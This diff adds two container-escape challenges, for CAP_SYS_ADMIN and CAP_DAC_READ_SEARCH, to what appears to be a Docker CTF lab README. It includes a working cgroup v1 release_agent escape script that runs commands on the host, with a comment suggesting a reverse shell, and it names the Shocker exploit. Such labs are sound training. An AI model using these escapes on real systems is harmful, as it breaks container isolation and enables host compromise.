@@ -74,3 +74,45 @@ docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock ctf-socket
   curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/escape_container/start
   ```
 </details>
+
+## chall03 - CAP_SYS_ADMIN
+
+```
+docker build -t ctf-sysadmin .
+docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ctf-sysadmin
+```
+
+<details>
+  <summary>Solution</summary>
+
+  1. Exploit `release_agent` via `cgroup v1`
+  ```
+  mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
+  mkdir /tmp/cgrp/x
+  echo 1 > /tmp/cgrp/x/notify_on_release
+  host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
+  echo "$host_path/cmd" > /tmp/cgrp/release_agent
+  cat > /cmd <<'EOF'
+  #!/bin/sh
+  ps aux > /output   # ou reverse shell
+  EOF
+  chmod +x /cmd
+  echo $$ > /tmp/cgrp/x/cgroup.procs
+  ```
+</details>
+
+## chall04 - CAP_DAC_READ_SEARCH
+
+```
+docker build -t ctf-dac .
+docker run --rm -it --cap-add=DAC_READ_SEARCH ctf-dac
+```
+
+<details>
+  <summary>Solution</summary>
+
+  1. Use shoker exploit that uses `open_by_handle_at()` and run it
+  ```
+  gcc shocker.c -o shocker
+  ```
+</details>
